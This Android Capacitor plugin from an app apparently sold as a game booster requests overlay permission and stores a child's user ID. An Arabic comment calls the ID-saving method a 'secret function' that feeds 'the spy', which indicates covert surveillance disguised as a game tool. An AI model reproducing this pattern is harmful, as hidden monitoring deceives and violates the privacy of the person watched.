package com.Ejram.gameboost;

import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.net.Uri;
import android.os.Build;
import android.provider.Settings;

import com.getcapacitor.Plugin;
import com.getcapacitor.PluginCall;
import com.getcapacitor.PluginMethod;
import com.getcapacitor.annotation.CapacitorPlugin;

@CapacitorPlugin(name = "GuardianNative")
public class GuardianPlugin extends Plugin {

    @PluginMethod
    public void showGameOverlay(PluginCall call) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(getContext())) {
            Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                    Uri.parse("package:" + getContext().getPackageName()));
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            getContext().startActivity(intent);
            call.reject("يرجى إعطاء صلاحية الظهور فوق التطبيقات");
        } else {
            Intent intent = new Intent(getContext(), GameOverlayService.class);
            getContext().startService(intent);
            call.resolve();
        }
    }

    // الدالة السرية: حفظ ID الطفل في الهاتف لكي يستخدمه الجاسوس
    @PluginMethod
    public void setChildUid(PluginCall call) {
        String uid = call.getString("uid");
        if(uid != null) {
            SharedPreferences prefs = getContext().getSharedPreferences("GuardianPrefs", Context.MODE_PRIVATE);
            prefs.edit().putString("childUid", uid).apply();
        }
        call.resolve();
    }
}
